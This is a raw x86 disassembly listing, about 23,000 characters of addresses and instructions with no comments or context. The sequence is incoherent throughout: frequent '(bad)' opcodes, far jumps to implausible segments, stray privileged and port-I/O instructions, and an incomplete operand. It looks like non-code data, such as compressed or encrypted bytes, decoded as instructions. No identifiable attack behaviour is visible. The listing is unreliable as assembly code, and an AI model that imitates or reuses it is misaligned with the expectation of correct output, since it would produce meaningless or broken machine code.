  420dda:	adc    al,0x55
  420ddc:	or     edi,DWORD PTR [edx+0x3300f6f]
  420de2:	mov    ah,0xc5
  420de4:	cmp    BYTE PTR [ebx+ecx*1],0x2b
  420de8:	jo     0x420d92
  420dea:	fsubr  DWORD PTR [edi+0x65]
  420ded:	add    ah,BYTE PTR [ecx+ecx*1+0x69c55184]
  420df4:	push   esi
  420df5:	push   es
  420df6:	mov    ebx,0xb4ed5cd4
  420dfb:	xor    ecx,DWORD PTR [esi]
  420dfd:	fst    DWORD PTR [ecx]
  420dff:	sbb    ebp,DWORD PTR [ecx-0x7]
  420e02:	pop    ds
  420e03:	inc    ebp
  420e04:	loope  0x420e62
  420e06:	dec    eax
  420e07:	jl     0x420d93
  420e09:	push   esi
  420e0a:	(bad)  
  420e0c:	je     0x420e31
  420e0e:	or     al,0x46
  420e10:	jmp    0x3056da3e
  420e15:	mov    al,ds:0x56a2d5ff
  420e1a:	aas    
  420e1b:	xchg   edx,eax
  420e1c:	xchg   ecx,eax
  420e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e1e:	mov    ecx,0xf64b2bc6
  420e23:	cmp    al,0xc6
  420e25:	inc    edi
  420e26:	fcom   DWORD PTR [edi+edi*8+0x1c]
  420e2a:	loop   0x420e75
  420e2c:	cmp    eax,0xfdb31e62
  420e31:	jge    0x420e93
  420e33:	sar    BYTE PTR [esi],1
  420e35:	pop    edx
  420e36:	loop   0x420df0
  420e38:	mov    ebx,0x8fbeb2f
  420e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e3e:	mov    WORD PTR [edx],?
  420e40:	(bad)  
  420e42:	jnp    0x420e6b
  420e44:	sbb    eax,0x93560a58
  420e49:	outs   dx,DWORD PTR ds:[esi]
  420e4a:	(bad)  
  420e4c:	push   eax
  420e4d:	test   eax,0x9248d473
  420e52:	in     eax,0xcf
  420e54:	(bad)  
  420e55:	sbb    BYTE PTR [edi-0x764076cd],ah
  420e5b:	lock stos BYTE PTR es:[edi],al
  420e5d:	ficomp DWORD PTR [edx]
  420e5f:	sbb    BYTE PTR [edx+0x14],bh
  420e62:	xor    BYTE PTR [ebp+0x15f3a80d],bl
  420e68:	call   0x8dc1:0x899f02fa
  420e6f:	lahf   
  420e70:	btc    DWORD PTR [ecx+0x6873305d],edi
  420e77:	cmp    ecx,DWORD PTR [edx-0x7a44c4e3]
  420e7d:	div    DWORD PTR [ebp-0x1b648cac]
  420e83:	dec    esp
  420e84:	xchg   DWORD PTR [ebp-0x76],ecx
  420e87:	jae    0x420ed2
  420e89:	or     BYTE PTR [ebx+0x23725a54],bh
  420e8f:	mov    dh,0xc4
  420e91:	add    eax,0x69426480
  420e96:	fst    QWORD PTR [ecx-0x62]
  420e99:	push   es
  420e9a:	aas    
  420e9b:	gs icebp 
  420e9d:	xchg   ebp,eax
  420e9e:	jl     0x420e4b
  420ea0:	scas   eax,DWORD PTR es:[edi]
  420ea1:	cs loop 0x420f01
  420ea4:	test   eax,0xec8786f6
  420ea9:	dec    edx
  420eaa:	mov    esi,es
  420eac:	adc    al,BYTE PTR [ebx]
  420eae:	mov    edi,ecx
  420eb0:	xor    BYTE PTR [esi+0x11],0xbc
  420eb4:	mov    BYTE PTR [ebp-0xb],ch
  420eb7:	fadd   QWORD PTR [edi+0x53]
  420eba:	ret    
  420ebb:	iret   
  420ebc:	pop    edi
  420ebd:	and    eax,0xa86488da
  420ec2:	pusha  
  420ec3:	das    
  420ec4:	dec    ecx
  420ec5:	rcr    DWORD PTR [ebx+0x74],cl
  420ec8:	mov    bh,0x2f
  420eca:	mov    al,0xcd
  420ecc:	or     dh,bh
  420ece:	xchg   ecx,eax
  420ecf:	(bad)  
  420ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ed1:	mov    eax,ds:0xc4dfd5d6
  420ed6:	mov    ds,WORD PTR [esi+ebx*2+0x73]
  420eda:	stc    
  420edb:	or     al,0x96
  420edd:	popa   
  420ede:	push   DWORD PTR [edi-0x2af8ba72]
  420ee4:	push   0x45
  420ee6:	fcmovbe st,st(5)
  420ee8:	ja     0x420eea
  420eea:	adc    DWORD PTR [ebp+0x5119f6e7],0x9f1858a
  420ef4:	fs in  eax,dx
  420ef6:	(bad)  
  420ef7:	cdq    
  420ef8:	push   ecx
  420ef9:	mov    ebx,0x3f9c636
  420efe:	pop    esi
  420eff:	add    al,0x37
  420f01:	xchg   ebx,eax
  420f02:	jge    0x420efc
  420f04:	inc    edx
  420f05:	jmp    0x420f19
  420f07:	adc    BYTE PTR [ecx+0x5f918655],cl
  420f0d:	dec    ecx
  420f0e:	sahf   
  420f0f:	xchg   esi,eax
  420f10:	mov    esi,0x1e074005
  420f15:	pop    edx
  420f16:	retf   0x366b
  420f19:	je     0x420f8b
  420f1b:	idiv   DWORD PTR [eax]
  420f1d:	lock jg 0x420ee8
  420f20:	loop   0x420f27
  420f22:	dec    BYTE PTR [ecx+0x9]
  420f25:	(bad)  
  420f27:	jns    0x420eb1
  420f29:	mov    ecx,0xb005f20a
  420f2e:	int3   
  420f2f:	out    dx,eax
  420f30:	dec    eax
  420f31:	add    cl,ah
  420f33:	pop    edi
  420f34:	scas   al,BYTE PTR es:[edi]
  420f35:	pop    edi
  420f36:	shr    DWORD PTR gs:[esi+0x7a756080],0x8c
  420f3e:	pop    ss
  420f3f:	xor    cl,BYTE PTR [ecx]
  420f41:	and    BYTE PTR [eax],bh
  420f43:	pop    ebp
  420f44:	retf   
  420f45:	scas   al,BYTE PTR es:[edi]
  420f46:	pusha  
  420f47:	std    
  420f48:	and    eax,0x54706c9d
  420f4d:	add    al,0x5b
  420f4f:	stos   DWORD PTR es:[edi],eax
  420f50:	sbb    eax,ecx
  420f52:	loopne 0x420fb7
  420f54:	xor    DWORD PTR [ebp+ecx*4-0x79fc8378],0x9d6e7a93
  420f5f:	(bad)  
  420f61:	repnz bound ebp,QWORD PTR [ecx-0x3a]
  420f65:	mov    al,0x84
  420f67:	adc    eax,0xdb5e7c34
  420f6c:	cld    
  420f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f6e:	stc    
  420f6f:	push   ds
  420f70:	arpl   WORD PTR [ebx],bx
  420f72:	mov    al,0xcb
  420f74:	loope  0x420f40
  420f76:	xlat   BYTE PTR es:[ebx]
  420f78:	push   esp
  420f79:	xchg   edx,eax
  420f7a:	inc    ebx
  420f7b:	div    BYTE PTR [ebx+0x2cb97fa1]
  420f81:	dec    edx
  420f82:	push   ds
  420f83:	mov    edx,DWORD PTR [ebp+eiz*2+0x4e]
  420f87:	jb     0x420f31
  420f89:	add    bh,al
  420f8b:	dec    ebp
  420f8c:	mov    al,ds:0xcb50af49
  420f91:	mov    ecx,0x61c9756e
  420f96:	int3   
  420f97:	pop    eax
  420f98:	call   0x32db4d15
  420f9d:	jae    0x420fd6
  420f9f:	xlat   BYTE PTR ds:[ebx]
  420fa0:	(bad)  
  420fa1:	cmp    al,0xe4
  420fa3:	or     BYTE PTR [ecx-0x4c8e5d85],bl
  420fa9:	jmp    FWORD PTR ds:0x53dc0976
  420faf:	adc    eax,0x5db70b9f
  420fb4:	pop    esp
  420fb5:	jmp    0x421017
  420fb7:	pop    ebp
  420fb8:	mov    esi,0x4638ac7c
  420fbd:	lock pusha 
  420fbf:	jmp    0x17a59229
  420fc4:	vpmullw xmm1,xmm0,XMMWORD PTR [eax-0x6430cd22]
  420fcd:	mov    ecx,0x7d89efbb
  420fd2:	and    bl,cl
  420fd4:	xor    ecx,DWORD PTR [ebx+0x2b]
  420fd7:	stos   DWORD PTR es:[edi],eax
  420fd8:	add    DWORD PTR [edx-0xa],ebp
  420fdb:	(bad)  
  420fdc:	add    dl,BYTE PTR fs:[eax+0x72]
  420fe0:	jmp    0x1c97:0x8b702942
  420fe7:	test   eax,0x247f06f7
  420fec:	adc    BYTE PTR ds:0x918cba24,bl
  420ff2:	jbe    0x420fe9
  420ff4:	dec    esi
  420ff5:	xor    BYTE PTR [eax+0x2cdd4883],al
  420ffb:	cmp    eax,0xc6f997c1
  421000:	mov    BYTE PTR [ebx+0x6c80ec88],ah
  421006:	adc    ch,ah
  421008:	xchg   edx,eax
  421009:	add    eax,0x4c4cacfc
  42100e:	mov    ds:0x962a5885,eax
  421013:	jnp    0x421073
  421015:	add    esp,edi
  421017:	sub    BYTE PTR [edi+0x6d],al
  42101a:	xchg   ebx,eax
  42101b:	jns    0x42101c
  42101d:	add    dh,BYTE PTR [edx-0x7d]
  421020:	in     eax,dx
  421021:	and    BYTE PTR [eax+0x1cefeab2],cl
  421027:	ror    BYTE PTR [ecx-0x844b6d1],cl
  42102d:	push   0x498a8914
  421032:	rcr    al,1
  421034:	jns    0x42103e
  421036:	xchg   esi,eax
  421037:	icebp  
  421038:	jne    0x421081
  42103a:	jo     0x420fda
  42103c:	push   0xffffff83
  42103e:	lock cmp dh,BYTE PTR [eax]
  421041:	test   al,0x9f
  421043:	push   0xad0d0b9f
  421048:	add    DWORD PTR [edx],eax
  42104a:	or     eax,0x442a2adf
  42104f:	aad    0x22
  421051:	push   ss
  421052:	pop    es
  421053:	jle    0x42101b
  421055:	inc    esp
  421056:	dec    bp
  421058:	adc    DWORD PTR [edi-0x7e],0xffffff95
  42105c:	mov    al,ds:0x54fa60c8
  421061:	test   BYTE PTR [ebp-0x2c],0x60
  421065:	(bad)  
  421066:	fdivr  QWORD PTR ds:0xbd2315d2
  42106c:	mov    BYTE PTR ds:0x51d53519,al
  421072:	mov    ah,BYTE PTR [edi]
  421074:	mov    ebp,0xf087bc02
  421079:	and    cl,bl
  42107b:	xchg   DWORD PTR [edx+0x33],ecx
  42107e:	pop    ds
  42107f:	arpl   di,si
  421081:	or     DWORD PTR ds:0x12ec242a,edx
  421087:	mov    eax,0xedb8ca2
  42108c:	test   BYTE PTR [ebp+0x839fa17],0xf9
  421093:	pushf  
  421094:	mov    DWORD PTR [ebp-0x44a39ca5],edi
  42109a:	jle    0x421089
  42109c:	imul   eax,DWORD PTR [ebx],0x17d65ef6
  4210a2:	xchg   DWORD PTR [edi+0x18],edx
  4210a5:	inc    eax
  4210a6:	pop    ds
  4210a7:	jae    0x42111d
  4210a9:	push   es
  4210aa:	pusha  
  4210ab:	test   al,0xd4
  4210ad:	lea    edx,ds:0xfea6d6d6
  4210b3:	into   
  4210b4:	inc    eax
  4210b5:	mov    bl,BYTE PTR [ebp+eax*8-0x1f]
  4210b9:	aaa    
  4210ba:	punpcklbw mm1,DWORD PTR [eax+0xe746ac3]
  4210c1:	int    0x4a
  4210c3:	sbb    DWORD PTR [eax],edi
  4210c5:	add    dh,BYTE PTR [esi-0x8c027da]
  4210cb:	rol    DWORD PTR [eax+0x66b71f34],1
  4210d1:	inc    ecx
  4210d2:	pop    edi
  4210d3:	xor    al,0x12
  4210d5:	sbb    BYTE PTR [ebp-0x55],bl
  4210d8:	mov    esp,0x5ad2e7c6
  4210dd:	inc    ebx
  4210de:	inc    edi
  4210df:	out    dx,eax
  4210e0:	gs pop ss
  4210e2:	pop    esp
  4210e3:	das    
  4210e4:	pop    ds
  4210e5:	mov    edi,0x424bd8fb
  4210ea:	cmc    
  4210eb:	stc    
  4210ec:	jo     0x42107c
  4210ee:	and    edx,esp
  4210f0:	xor    al,0xdd
  4210f2:	out    dx,al
  4210f3:	lock mov eax,0x88d99861
  4210f9:	aas    
  4210fa:	call   0x5c3ad48d
  4210ff:	pop    eax
  421100:	repz add dl,dl
  421103:	jns    0x42116d
  421105:	or     DWORD PTR [edi+0x51],eax
  421108:	lods   al,BYTE PTR ds:[esi]
  421109:	pop    edx
  42110a:	cdq    
  42110b:	test   edi,edi
  42110d:	or     BYTE PTR [ebx+0x7b],bh
  421110:	and    eax,0x8c9737dd
  421115:	add    BYTE PTR [eax+0x3802ce72],bl
  42111b:	addr16 jbe 0x4210a6
  42111e:	sbb    edi,ebp
  421120:	fwait
  421121:	mov    edx,0xb1888015
  421126:	sbb    al,0xd0
  421128:	pushf  
  421129:	nop
  42112a:	stos   DWORD PTR es:[edi],eax
  42112b:	mov    WORD PTR [esi+0x138e061f],cs
  421131:	cmp    DWORD PTR [ebx+0x18],edi
  421134:	imul   edi,ecx,0x73946460
  42113a:	sbb    al,cl
  42113c:	mov    ebx,0x88528994
  421141:	out    dx,al
  421142:	dec    edx
  421143:	imul   edi,DWORD PTR [eax+0xdd19605],0x94f75bd0
  42114d:	jle    0x4211af
  42114f:	mov    bl,0xf7
  421151:	jg     0x4211b4
  421153:	aad    0x97
  421155:	mov    edx,0x27bc2d0
  42115a:	sbb    dh,bh
  42115c:	lock adc DWORD PTR [ebp+0xbbb861c],ecx
  421163:	shl    DWORD PTR [edi+0x3d4f7ef],cl
  421169:	or     cl,BYTE PTR [ecx+0x18]
  42116c:	mov    BYTE PTR [eax+esi*1],bh
  42116f:	push   edx
  421170:	fs add esp,edx
  421173:	jno    0x421167
  421175:	cmp    bh,al
  421177:	popa   
  421178:	(bad)  
  421179:	fdiv   DWORD PTR [edi+0x5c97788f]
  42117f:	mov    DWORD PTR [ecx+0x961e692],0x300f3cf1
  421189:	sbb    al,0x86
  42118b:	xchg   edi,eax
  42118c:	retf   
  42118d:	sbb    dl,ah
  42118f:	push   ds
  421190:	cmp    DWORD PTR [ecx],esi
  421192:	test   ah,bh
  421194:	mov    al,0x9d
  421196:	outs   dx,DWORD PTR ds:[esi]
  421197:	sbb    eax,0x6ae65189
  42119c:	cli    
  42119d:	cmp    WORD PTR [ebx+0x265b725e],0xff88
  4211a5:	dec    edi
  4211a6:	push   ss
  4211a7:	out    0x7a,eax
  4211a9:	retf   
  4211aa:	iret   
  4211ab:	xchg   ebx,esi
  4211ad:	add    al,BYTE PTR [edx-0x7e]
  4211b0:	adc    al,0x17
  4211b2:	sub    eax,DWORD PTR fs:[edx+eax*1]
  4211b6:	(bad)  
  4211b7:	out    dx,al
  4211b8:	sub    ecx,DWORD PTR [edi+0x27]
  4211bb:	and    cl,BYTE PTR [ebx]
  4211bd:	bound  esi,QWORD PTR [eax-0x57]
  4211c0:	jle    0x42118a
  4211c2:	and    edx,edi
  4211c4:	lods   eax,DWORD PTR ds:[esi]
  4211c5:	mov    ds:0x5debb086,al
  4211ca:	fdiv   st,st(0)
  4211cc:	inc    edi
  4211cd:	inc    esp
  4211ce:	cmp    bh,dl
  4211d0:	loopne 0x42121a
  4211d2:	mov    al,ds:0x1e21e2eb
  4211d7:	(bad)  
  4211d8:	out    dx,eax
  4211d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211da:	xchg   edi,eax
  4211db:	pop    ss
  4211dc:	in     al,dx
  4211dd:	mov    edi,0xe60cd4c8
  4211e2:	sar    DWORD PTR [ebp-0x57],cl
  4211e5:	int    0x73
  4211e7:	xchg   esi,eax
  4211e8:	mov    ah,0x6b
  4211ea:	adc    BYTE PTR [eax],al
  4211ec:	push   es
  4211ed:	inc    esi
  4211ee:	enter  0x690b,0xfc
  4211f2:	pop    ebp
  4211f3:	iret   
  4211f4:	sbb    BYTE PTR [ebx],al
  4211f6:	sahf   
  4211f7:	sbb    al,BYTE PTR [edi-0x17]
  4211fa:	jp     0x421189
  4211fc:	sub    ch,dh
  4211fe:	pop    ds
  4211ff:	lea    edi,[ebx+0x2d04b5ca]
  421205:	xlat   BYTE PTR ds:[ebx]
  421206:	repz pop edi
  421208:	jae    0x42118a
  42120a:	pop    ds
  42120b:	sbb    al,BYTE PTR [ebx+ecx*4-0x38]
  42120f:	jp     0x421204
  421211:	dec    eax
  421212:	lds    sp,DWORD PTR [ebx+0x4b]
  421216:	aad    0xe9
  421218:	pop    edi
  421219:	add    edx,ebx
  42121b:	mov    cl,0x7b
  42121d:	jns    0x42129c
  42121f:	or     eax,0xf823e977
  421224:	fiadd  WORD PTR [edx+0x3db08f7c]
  42122a:	rcl    ch,1
  42122c:	dec    esp
  42122d:	jno    0x421205
  42122f:	add    ebx,ebp
  421231:	ja     0x4211b8
  421233:	mov    BYTE PTR ds:[edi-0x7c],cl
  421237:	sbb    esp,DWORD PTR [ebx]
  421239:	pop    edx
  42123a:	push   ebp
  42123b:	push   ss
  42123c:	popa   
  42123d:	add    bh,BYTE PTR [edx+0x709205ab]
  421243:	(bad)  
  421244:	mov    bl,0x70
  421246:	sub    edx,ecx
  421248:	mov    ebx,ebx
  42124a:	(bad)  
  42124b:	(bad)  
  42124c:	repnz sbb BYTE PTR [ebx],dh
  42124f:	leave  
  421250:	call   0xfb83:0x14c2e602
  421257:	sar    eax,cl
  421259:	enter  0x5560,0xe6
  42125d:	outs   dx,DWORD PTR ds:[esi]
  42125e:	cdq    
  42125f:	hlt    
  421260:	jbe    0x4212c4
  421262:	adc    dl,bh
  421264:	xchg   edx,eax
  421265:	iret   
  421266:	push   esi
  421267:	inc    eax
  421268:	push   ebx
  421269:	fcomi  st,st(0)
  42126b:	call   0xf989:0xf6c557c5
  421272:	inc    cx
  421274:	les    ecx,FWORD PTR [ecx]
  421276:	mov    ecx,0x7fa22bd4
  42127b:	push   eax
  42127c:	mov    eax,eax
  42127e:	mov    edi,0x6aff8f9a
  421283:	jne    0x4212c5
  421285:	dec    ebx
  421286:	xor    bl,BYTE PTR [ebp-0x6e]
  421289:	push   ebx
  42128a:	and    eax,0x455b28dc
  42128f:	aam    0x90
  421291:	sti    
  421292:	fsubr  DWORD PTR [ebx+0x2ee4889d]
  421298:	mov    DWORD PTR [ebx-0xe],ebp
  42129b:	lods   al,BYTE PTR ds:[esi]
  42129c:	cmc    
  42129d:	jl     0x421291
  42129f:	test   DWORD PTR [eax+0x23722605],0x42289542
  4212a9:	fisub  DWORD PTR [eax+0x4d]
  4212ac:	add    edx,DWORD PTR [edi]
  4212ae:	mov    dl,bh
  4212b0:	test   BYTE PTR [edx+0x6f],cl
  4212b3:	xlat   BYTE PTR ds:[ebx]
  4212b4:	inc    ebp
  4212b5:	stc    
  4212b6:	mov    ch,0x43
  4212b8:	jmp    0x1f63:0x2e340037
  4212bf:	test   eax,0xe5a8facd
  4212c4:	mov    esp,0x628b62a3
  4212c9:	shr    BYTE PTR [ebp-0x56],0x52
  4212cd:	mov    ds:0x90557411,eax
  4212d2:	dec    edi
  4212d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d4:	mov    DWORD PTR [ebx-0x1043a18a],ebx
  4212da:	lds    ebx,FWORD PTR [ecx+edi*8+0x5]
  4212de:	push   0x29f21ef7
  4212e3:	loop   0x4212be
  4212e5:	leave  
  4212e6:	adc    BYTE PTR [edx-0x12fcef89],0x89
  4212ed:	pop    edi
  4212ee:	leave  
  4212ef:	sub    al,0x4d
  4212f1:	cwde   
  4212f2:	xchg   esp,eax
  4212f3:	fwait
  4212f4:	retf   0x9f22
  4212f7:	xlat   BYTE PTR ds:[ebx]
  4212f8:	js     0x4212c3
  4212fa:	xchg   DWORD PTR ds:0xecd3fd90,edx
  421300:	inc    edi
  421301:	ins    BYTE PTR es:[edi],dx
  421302:	pop    ds
  421303:	lods   eax,DWORD PTR ds:[esi]
  421304:	fwait
  421305:	mov    esp,0xf20affad
  42130a:	dec    ebx
  42130b:	aam    0x1
  42130d:	dec    ebp
  42130e:	scas   al,BYTE PTR es:[edi]
  42130f:	js     0x42129f
  421311:	or     ebx,esp
  421313:	test   DWORD PTR [eax+0x518148a5],ecx
  421319:	loope  0x42132e
  42131b:	lock add eax,DWORD PTR [edx]
  42131e:	cmp    cl,dl
  421320:	pop    esp
  421321:	inc    ebx
  421322:	jns    0x4212b6
  421324:	sub    al,0x9
  421326:	outs   dx,BYTE PTR ds:[esi]
  421327:	xchg   ebp,eax
  421328:	and    al,0x91
  42132a:	rol    BYTE PTR [edi],1
  42132c:	mov    bh,BYTE PTR [ebx-0x20a60a49]
  421332:	xlat   BYTE PTR ds:[ebx]
  421333:	inc    esp
  421334:	lds    esp,FWORD PTR [eax+0x1f]
  421337:	sbb    eax,DWORD PTR [ebx+0x6c]
  42133a:	cwde   
  42133b:	jo     0x421368
  42133d:	out    dx,al
  42133e:	pusha  
  42133f:	lds    esi,FWORD PTR [ecx+0x49]
  421342:	outs   dx,DWORD PTR ds:[esi]
  421343:	inc    edx
  421344:	mov    WORD PTR [edx-0x11],gs
  421347:	test   DWORD PTR [esi+0x43],ebp
  42134a:	stc    
  42134b:	lock add esp,edx
  42134e:	pusha  
  42134f:	popa   
  421350:	cmc    
  421351:	sar    BYTE PTR [edi+eax*4],cl
  421354:	shl    cl,0x3c
  421357:	(bad)  
  421358:	mov    ds:0xccc5edad,al
  42135d:	mov    eax,0xe323fda1
  421362:	pop    ds
  421363:	repz push ebx
  421365:	pop    eax
  421366:	test   al,0xee
  421368:	je     0x421306
  42136a:	jne    0x421340
  42136c:	faddp  st(3),st
  42136e:	pop    ebx
  42136f:	scas   eax,DWORD PTR es:[edi]
  421370:	xchg   edi,eax
  421371:	pusha  
  421372:	xor    edx,DWORD PTR [eax-0x77]
  421375:	stc    
  421376:	xor    ebx,ebp
  421378:	in     al,0x7d
  42137a:	lods   al,BYTE PTR ds:[esi]
  42137b:	rcl    DWORD PTR [edx+esi*4],cl
  42137e:	or     DWORD PTR [ecx],ebp
  421380:	(bad)
  421384:	jmp    0xaadd22d9
  421389:	xchg   esp,eax
  42138a:	pusha  
  42138b:	cmp    esi,DWORD PTR [ebp-0x7c]
  42138e:	ds xchg edx,eax
  421390:	call   0x9b19:0x34d1bc40
  421397:	les    esi,FWORD PTR [esi+0x264edf87]
  42139d:	ss ins BYTE PTR es:[edi],dx
  42139f:	pop    ds
  4213a0:	stc    
  4213a1:	sub    al,BYTE PTR [ebp-0x61]
  4213a4:	test   eax,0xb8ab8a7f
  4213a9:	and    al,0x62
  4213ab:	jb     0x421365
  4213ad:	or     ebx,DWORD PTR [edi+0x7878d30d]
  4213b3:	or     DWORD PTR [eax+0x502ce397],0x7b58ffc3
  4213bd:	add    ch,BYTE PTR [edx+0x73e2d06c]
  4213c3:	ins    DWORD PTR es:[edi],dx
  4213c4:	dec    eax
  4213c5:	fstp   DWORD PTR [edi]
  4213c7:	mov    ebx,0xc8617eab
  4213cc:	mov    dh,0xa7
  4213ce:	scas   eax,DWORD PTR es:[edi]
  4213cf:	aam    0x2e
  4213d1:	cld    
  4213d2:	sub    al,0x54
  4213d4:	jb     0x4213cb
  4213d6:	jns    0x4213fb
  4213d8:	mov    BYTE PTR [ebx-0x8],cl
  4213db:	stos   DWORD PTR es:[edi],eax
  4213dc:	and    BYTE PTR [esi-0xe],ch
  4213df:	imul   ebp,edx,0x3
  4213e2:	mov    esi,0x2d71b933
  4213e7:	jo     0x4213bb
  4213e9:	sti    
  4213ea:	loop   0x4213c8
  4213ec:	push   eax
  4213ed:	cld    
  4213ee:	jl     0x42142d
  4213f0:	icebp  
  4213f1:	add    eax,0x553e1455
  4213f6:	mov    ah,0x75
  4213f8:	pop    es
  4213f9:	es ror dh,0x17
  4213fd:	xor    BYTE PTR [ecx-0x27],0x8b
  421401:	shr    BYTE PTR [ebx-0xd5df062],1
  421407:	popa   
  421408:	mov    dh,0x33
  42140a:	sub    al,0xc8
  42140c:	push   es
  42140d:	int    0x84
  42140f:	xlat   BYTE PTR ds:[ebx]
  421410:	test   eax,0x22dc00a3
  421415:	sub    edi,DWORD PTR [ebp+edi*2+0x54]
  421419:	xchg   edi,eax
  42141a:	pop    ebx
  42141b:	mov    bl,0xb5
  42141d:	xchg   esi,edx
  42141f:	sti    
  421420:	lock and al,0x55
  421423:	fdivrp st(4),st
  421425:	inc    ebp
  421426:	ror    edi,0xcb
  421429:	push   ds
  42142a:	add    DWORD PTR [edi+0x50],edi
  42142d:	pop    edi
  42142e:	pop    esp
  42142f:	popf   
  421430:	jbe    0x421435
  421432:	pop    eax
  421433:	xchg   DWORD PTR [edx],ecx
  421435:	add    BYTE PTR [esi],cl
  421437:	xor    al,0xf2
  421439:	call   DWORD PTR [edi-0x2b]
  42143c:	das    
  42143d:	sti    
  42143e:	mov    edi,0x52a85051
  421443:	aam    0xdc
  421445:	cmp    BYTE PTR [ecx-0x412d80c8],ah
  42144b:	mov    eax,ds:0x5d0fdd1
  421450:	xchg   BYTE PTR [ebx-0x3f],ah
  421453:	imul   cl
  421455:	mov    al,ds:0x5b56d4d
  42145a:	and    BYTE PTR [ecx],al
  42145c:	(bad)  
  42145d:	sbb    dh,bh
  42145f:	mov    al,0x5c
  421461:	cwde   
  421462:	jnp    0x4214d1
  421464:	mov    edx,0x4df957f1
  421469:	sbb    al,0xb
  42146b:	rcr    BYTE PTR [ecx+0x52],cl
  42146e:	(bad)
  421471:	add    eax,0xcbefadca
  421476:	sub    dl,BYTE PTR [edi+0x52]
  421479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42147a:	pusha  
  42147b:	aas    
  42147c:	ins    DWORD PTR es:[edi],dx
  42147d:	cmp    ch,BYTE PTR [ecx]
  42147f:	sahf   
  421480:	pop    edi
  421481:	in     al,dx
  421482:	adc    al,0xf2
  421484:	mov    esi,0xf061fc02
  421489:	cmp    DWORD PTR [ebp-0x6d8b9f49],ebx
  42148f:	pop    ds
  421490:	jecxz  0x421494
  421492:	aas    
  421493:	jbe    0x421436
  421495:	and    eax,0x2d319036
  42149a:	jl     0x4214ec
  42149c:	daa    
  42149d:	mov    ds:0xed62ed1f,al
  4214a2:	lods   al,BYTE PTR ds:[esi]
  4214a3:	retf   0x3b8b
  4214a6:	or     ch,0xde
  4214a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214aa:	mov    ds:0x32ae882e,eax
  4214af:	add    BYTE PTR [eax+0x35],bl
  4214b2:	mov    bl,0x28
  4214b4:	jno    0x421491
  4214b6:	adc    BYTE PTR [esi+eax*4+0x1],bh
  4214ba:	or     al,0x8c
  4214bc:	mov    esi,0x20c33e72
  4214c1:	push   0x3
  4214c3:	aam    0xef
  4214c5:	and    al,0x11
  4214c7:	xchg   ecx,eax
  4214c8:	add    esi,esi
  4214ca:	icebp  
  4214cb:	fadd   QWORD PTR [ecx-0x23]
  4214ce:	pop    ds
  4214cf:	daa    
  4214d0:	dec    eax
  4214d1:	imul   edx,DWORD PTR [edx+0x4d],0x66
  4214d5:	inc    edx
  4214d6:	pusha  
  4214d7:	aam    0x75
  4214d9:	pop    esi
  4214da:	iretw  
  4214dc:	mov    al,ds:0x8bba85f2
  4214e1:	jmp    0x90693703
  4214e6:	inc    ecx
  4214e7:	cmp    ebx,DWORD PTR [eax-0x5f]
  4214ea:	adc    ch,0xc2
  4214ed:	sbb    al,BYTE PTR cs:[ebx-0x3b5df046]
  4214f4:	mov    DWORD PTR [ecx-0x287d33cf],edi
  4214fa:	lea    ebx,[eax+0xfe6058a]
  421500:	sub    DWORD PTR [edx-0x7d],esp
  421503:	mov    ebp,0xa51f55ee
  421508:	rcl    BYTE PTR [edi-0xc5b11ab],cl
  42150e:	repnz aam 0x19
  421511:	inc    esp
  421512:	and    DWORD PTR [ebp-0x6523c804],ebp
  421518:	mov    DWORD PTR [ebx+0x15],edx
  42151b:	ds mov cl,0xfd
  42151e:	mov    BYTE PTR [esi+ebp*8+0x5cfa4402],cl
  421525:	inc    esp
  421526:	mov    ebx,0x609c0d44
  42152b:	imul   ebx,DWORD PTR [esi+0xcf6fd5f],0x53
  421532:	sub    edi,edx
  421534:	dec    edx
  421535:	fwait
  421536:	aam    0x2e
  421538:	xchg   edi,eax
  42153a:	cmp    al,0x3f
  42153c:	jge    0x4214be
  42153e:	pop    ds
  42153f:	popf   
  421540:	fcmovnu st,st(2)
  421542:	inc    edx
  421543:	rcl    DWORD PTR [eax-0x502a0b94],0xf6
  42154a:	imul   ecx,DWORD PTR [edi+0x54],0x8972448e
  421551:	std    
  421552:	or     BYTE PTR [ecx+0x3020af17],0xb4
  421559:	add    eax,0xc3aebb50
  42155e:	ficomp WORD PTR gs:[eax-0x66]
  421562:	nop
  421563:	dec    edi
  421564:	pop    esp
  421565:	add    ecx,ebp
  421567:	enter  0x216d,0xdf
  42156b:	xchg   DWORD PTR [edi+eiz*1-0x32],eax
  42156f:	ret    
  421570:	inc    edx
  421571:	mov    esi,0xa4e2d2c4
  421576:	mov    dl,0xab
  421578:	pop    ecx
  421579:	ins    DWORD PTR es:[edi],dx
  42157a:	arpl   di,bx
  42157c:	jo     0x4215e8
  42157e:	jge    0x421513
  421580:	mov    al,ds:0x43d4b23c
  421585:	mov    ecx,DWORD PTR [edx-0x79]
  421588:	stos   BYTE PTR es:[edi],al
  421589:	add    eax,0x500ab9e4
  42158e:	popa   
  42158f:	push   edi
  421590:	add    al,0x93
  421592:	mov    bh,0x15
  421594:	mov    al,ds:0xf0ab1fbc
  421599:	loop   0x4215d3
  42159b:	mov    ah,0x93
  42159d:	add    cl,BYTE PTR [ebx+ebp*4+0x2c]
  4215a1:	fucomi st,st(7)
  4215a3:	ins    BYTE PTR es:[edi],dx
  4215a4:	cs jne 0x4215c5
  4215a7:	inc    ebx
  4215a8:	or     al,0x56
  4215aa:	xor    DWORD PTR [ebx+0x5c],eax
  4215ad:	aaa    
  4215ae:	nop
  4215af:	aam    0xbf
  4215b1:	(bad)  
  4215b2:	xchg   esi,eax
  4215b3:	sbb    esi,DWORD PTR [eax]
  4215b5:	xchg   BYTE PTR [ecx+0x7375b76d],ch
  4215bb:	mov    ds:0x41bc8489,al
  4215c0:	scas   eax,DWORD PTR es:[edi]
  4215c1:	cdq    
  4215c2:	jle    0x421604
  4215c4:	es or  eax,0xa991fb60
  4215ca:	shr    BYTE PTR [edx-0x7c],0xf1
  4215ce:	pop    ds
  4215cf:	stos   DWORD PTR es:[edi],eax
  4215d0:	mov    ebx,DWORD PTR [ebp+edx*2+0x31852a04]
